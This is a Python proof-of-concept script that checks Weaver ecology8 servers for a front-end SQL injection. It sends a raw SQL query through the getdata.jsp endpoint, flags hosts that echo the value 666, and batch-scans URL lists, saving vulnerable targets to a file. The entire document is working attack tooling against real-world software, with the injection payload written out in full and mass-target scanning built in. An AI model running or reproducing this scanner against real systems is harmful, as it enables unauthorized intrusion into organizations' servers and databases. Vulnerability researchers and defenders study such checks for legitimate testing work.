#!/usr/bin/python
# Env: python3
# Author: afei00123
# -*- coding: utf8 -*-

import requests, urllib3,time, argparse
from colorama import init
init(autoreset=True)

def title():
    print("")
    print('*'.center(60, '*'))
    print("Version：ecology8".center(40))
    print("github：https://github.com/ltfafei".center(50))
    print("gitee：https://gitee.com/afei00123".center(50))
    print("CSDN: afei00123.blog.csdn.net".center(50))
    print("公众号：网络运维渗透".center(50))
    print("")
    print('*'.center(60, '*'))
    print("")

class ecology8_front_desk_SQLi_POC():
    def ecology8_front_desk_SQLi_Check(self, url):
        target_url = f"{url}/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select 666 as id"
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        try:
            respon_data = requests.get(target_url, timeout=3).text
            if int(respon_data) == 666:
                print(f"\033[31m[+] {url}存在SQLi")
                with open("vuln-SQLi_urls.txt", 'a') as f:
                    f.writelines(url + "\n")
        except Exception:
            print(f"{url}不存在SQLi")
            return url

    def ecology8_SQLi_Batch_POC(self, url, file):
        if url:
            return True
        elif file:
            for url in file:
                url = url.replace('\n', '')
                time.sleep(1)
                self.ecology8_front_desk_SQLi_Check(url)

if(__name__ == "__main__"):
    title()
    parser = argparse.ArgumentParser(description="ecology8_front_desk_SQLi_POC Script")
    parser.add_argument(
        '-u', '--url', type=str,
        help='Please input target url. eg: https://ip:port'
    )
    parser.add_argument(
        '-f', '--file', type=argparse.FileType('r'),
        help='Please input urls file path. eg: c:\\urls.txt'
    )
    args = parser.parse_args()
    run_POC = ecology8_front_desk_SQLi_POC()
    if args.file:
        run_POC.ecology8_SQLi_Batch_POC(args.url, args.file)
        print("\n[done] 批量探测完成，请查看：vuln-SQLi_urls.txt")
    if args.url:
        run_POC.ecology8_front_desk_SQLi_Check(args.url)